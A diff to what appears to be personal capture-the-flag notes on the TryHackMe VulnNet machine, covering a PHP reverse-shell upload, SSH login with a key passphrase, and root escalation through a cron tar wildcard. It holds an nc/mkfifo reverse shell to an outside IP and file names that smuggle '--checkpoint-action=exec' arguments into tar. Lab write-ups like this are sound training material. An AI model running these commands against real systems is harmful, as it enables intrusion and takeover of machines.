@@ -79,6 +79,66 @@ Stopped: Mon Jun 02 13:01:08 2025
 ─$ curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761drmfsls
 {"success":"yes","file_name":"17488640255add7e","extension":"php","file_directory":"2025\/06\/02"}                                                                                                                     
 
+## GET user access
+
+┌──(kali㉿kali)-[~/Documents/THM/THM_VulnNet]
+└─$ chmod 600 id_rsa    
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/THM/THM_VulnNet]
+└─$ ssh  -i id_rsa server-management@vulnnet.thm
+Enter passphrase for key 'id_rsa': oneTWO3gOyac
+
+## Found this in crontab
+server-management@vulnnet:/$ cat /var/opt/backupsrv.sh
+#!/bin/bash
+
+# Where to backup to.
+dest="/var/backups"
+
+# What to backup. 
+cd /home/server-management/Documents
+backup_files="*"
+
+# Create archive filename.
+day=$(date +%A)
+hostname=$(hostname -s)
+archive_file="$hostname-$day.tgz"
+
+# Print start status message.
+echo "Backing up $backup_files to $dest/$archive_file"
+date
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo "Backup finished"
+date
+
+## Linux Privilege Escalation Using tar Wildcards
+server-management@vulnnet:/$ cd ./home/server-management/Documents/
+server-management@vulnnet:~/Documents$ ls
+'Daily Job Progress Report Format.pdf'  'Employee Search Progress Report.pdf'
+server-management@vulnnet:~/Documents$ echo "mkfifo /tmp/lhennp; nc 10.8.28.108 9001 0</tmp/lhennp | /bin/sh > /tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+server-management@vulnnet:~/Documents$ cat shell.sh 
+mkfifo /tmp/lhennp; nc 10.8.28.108 9001 0</tmp/lhennp | /bin/sh > /tmp/lhennp 2>&1; rm /tmp/lhennp
+server-management@vulnnet:~/Documents$ touch ./--checkpoint=1
+server-management@vulnnet:~/Documents$ touch ./--checkpoint-action=exec=sh\ shell.sh
+server-management@vulnnet:~/Documents$ chmod +x shell.sh 
+server-management@vulnnet:~/Documents$ ls -la
+total 84
+drwxr-xr-x  2 server-management server-management  4096 Jun  5 12:04  .
+drwxrw---- 18 server-management server-management  4096 Jan 24  2021  ..
+-rw-rw-r--  1 server-management server-management     0 Jun  5 12:04 '--checkpoint=1'
+-rw-rw-r--  1 server-management server-management     0 Jun  5 12:04 '--checkpoint-action=exec=sh shell.sh'
+-rw-r-----  1 server-management server-management 35144 Jan 23  2021 'Daily Job Progress Report Format.pdf'
+-rw-r-----  1 server-management server-management 33612 Jan 23  2021 'Employee Search Progress Report.pdf'
+-rwxrwxr-x  1 server-management server-management    42 Jun  5 12:03  shell.sh
+server-management@vulnnet:~/Documents$ 
+
+
 
 
 
